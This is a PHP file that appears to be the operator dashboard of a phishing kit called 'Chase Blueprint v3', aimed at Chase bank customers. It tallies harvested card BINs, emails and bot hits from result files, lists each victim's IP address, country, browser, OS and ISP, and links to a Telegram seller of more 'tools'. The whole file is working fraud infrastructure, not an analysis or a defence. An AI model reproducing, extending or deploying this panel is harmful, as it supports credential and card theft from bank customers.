<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
header("Refresh:10;");
include 'config.php';


error_reporting(0);
session_start();
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_click = count_c("../result/total_click.txt");
$total_cc = count_c("../result/total_bin.txt");
$total_bank = count_c("../result/total_click.txt");
$total_bot = count_c("../result/bot.txt");
$total_email = count_c("../result/total_email.txt");
?>


<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chase Blueprint Login</title>

    <!-- Styling -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600|Raleway:400,700" rel="stylesheet">
<link href="files/admin/css/all.min248f.css?v=b4c444" rel="stylesheet">
<link href="files/admin/css/fontawesome-all.min.css" rel="stylesheet">
<link href="files/admin/css/custom.css" rel="stylesheet">
<link rel="shortcut icon" href="files/admin/favicon.png">
<script src="https://kit.fontawesome.com/b7fa9575a5.js"></script>


</head>
<body data-phone-cc-input="1">



<section id="main-menu">

    <nav id="nav" class="navbar navbar-default navbar-main" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#primary-nav">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="primary-nav">

                <ul class="nav navbar-nav">

<li menuitemname="Home" class="" id="Primary_Navbar-Home">
<a href="index.php">Home</a>
</li>
<li menuitemname="Services" class="dropdown" id="Primary_Navbar-Services">

<li menuitemname="Open Ticket" class="" id="Primary_Navbar-Open_Ticket">
<a href="setting.php">Config</a>
</li>
<li menuitemname="Affiliates" class="" id="Primary_Navbar-Affiliates">
<a href="info.php">info</a>
</li>
<li menuitemname="Affiliates" class="" id="Primary_Navbar-Affiliates">
<a href="visitor.php">visitor info</a>
</li>
</ul>

<ul class="nav navbar-nav navbar-right">
<li menuitemname="Order New Services" class="" id="Primary_Navbar-Affiliates">
<a href="https://t.me/blue_prints">Order New Tools</a>
<li menuitemname="Account" class="dropdown account" id="Secondary_Navbar-Account">
<a >Hello,<?php echo $yourname; ?> !&nbsp;</a>
<li menuitemname="Logout" class="" id="Primary_Navbar-Affiliates">
<a href="logout.php">Logout</a>
</li>
</ul>
</li>
</ul>


</div><!-- /.navbar-collapse -->
</div>
</nav>
</section>



<section id="main-body">
<div class="container">
<div class="row">
<div class="col-md-9 pull-md-right">
<div class="header-lined">
<h1>Welcome Back, <?php echo $yourname; ?></h1>

</div>
</div>


<div class="col-md-3 pull-md-left sidebar">
<div menuitemname="Client Details" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-user"></i>&nbsp;Your Info
<i class="fas fa-chevron-up panel-minimise pull-right"></i>
</h3>
</div>
<div class="panel-body" style="background-image: url('files/admin/aaaaaa.jpg');background-repeat:no-repeat; background-size: 100% 100%;">
<strong>Hi.</strong><br><br>

<strong>Name: <a style="color:#f0ad4e">[ <?php echo $yourname; ?> ]</a></strong><br>
<strong>Page : <a style="color:#F08080">Chase Blueprint v3</a></strong><br>
<strong>Date : <a style="color:#87CEFA;"><?php echo date("Y/m/d"); ?><a></strong><br><br><br>

<style>
input[type=button].btn-block, input[type=reset].btn-block, input[type=submit].btn-block {
    width: 120px;
}
</style>

</div>
<div class="panel-footer clearfix">
<a href="setting.php" class="btn btn-success btn-sm btn-block">
<i class="fas fa-pencil-alt"></i> Update
</a>
</div>
</div>
</div>
<div class="col-md-9 pull-md-right main-content">
<div class="container-fluid">


  <div class="card-header py-3">
    <h6 class="m-0 font-weight-bold text-primary">BLUEPRINT INFO
    </h6>
  </div>

 <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        
                        
                       <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">List Visitor (<?php echo $total_click;?>)</h2>
                                <div class="table--no-card m-b-40" style="max-height: 500px;overflow:scroll;">
                                    <table class="table table-borderless table-striped table-earning">
                                        <thead>
                                            <tr>
                                                <th>IP Address</th>
                                                <th>Country</th>
                                                <th>Browser</th>
                                                <th>OS</th>
                                                <th>ISP</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            if(file_exists("../result/total_click.txt")){
                                            $bin = file_get_contents("../result/total_click.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $ip = $bins[0];
                                                $code = $bins[1];
                                                $country = $bins[2];
                                                $device = $bins[3];
                                                $os = $bins[4];
                                                $isp = $bins[5];
                                                if($code == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img src='https://www.countryflags.io/".$code."/flat/16.png'> ".$ip."</td>
                                                <td>".$country."</td>
                                                <td>".$device."</td>
                                                <td>".$os."</td>
                                                <td>".$isp."</td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                                            }
                                            ?>
                                        
                                            
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</div>
</div>
</section>



</body>
</html>


<!-- /.container-fluid -->
